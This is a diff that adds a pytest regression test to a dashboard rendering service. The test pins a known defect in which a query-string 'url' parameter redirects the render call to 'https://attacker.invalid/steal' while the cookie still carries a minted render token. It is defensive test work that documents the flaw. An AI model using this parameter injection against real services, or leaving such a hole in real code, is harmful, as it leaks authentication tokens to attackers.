@@ -182,6 +182,33 @@ def test_render_route(principal, route, status, rendered_as, render_app, renders
     }
 
 
+ATTACKER_URL = 'https://attacker.invalid/steal'
+
+
+@pytest.mark.parametrize(
+    'principal,route,rendered_as',
+    [
+        ('anonymous', 'png/thumbnail', 'renderbot@authz.invalid'),
+        ('dashboard_acl_viewer', 'pdf', 'dashboard_acl_viewer@authz.invalid'),
+    ],
+)
+def test_caller_chosen_url_receives_the_minted_render_token(
+    principal, route, rendered_as, render_app, renders
+):
+    '''WP-0i N7: defect pinned as today; flips in WP-0i. `url` is one of
+    SUPPORTED_RENDERING_PARAMS, so a query-string `url` replaces the dashboard
+    page in the urlbox call while the cookie still carries the token minted for
+    the render.'''
+    response = _get(
+        render_app, principal, f'/dashboard/{SLUG}/{route}?url={ATTACKER_URL}'
+    )
+
+    assert response.status_code == 200
+    (call,) = renders
+    assert call['url'] == ATTACKER_URL
+    assert _token_claims(render_app, call)['identity'] == rendered_as
+
+
 def test_stored_thumbnail_is_rendered_by_the_render_bot_and_shared(render_app, renders):
     '''N2: defect pinned as today; flips in WP-0i. dashboard_acl_viewer may
     view the dashboard but holds no query policy, so its own queries see no
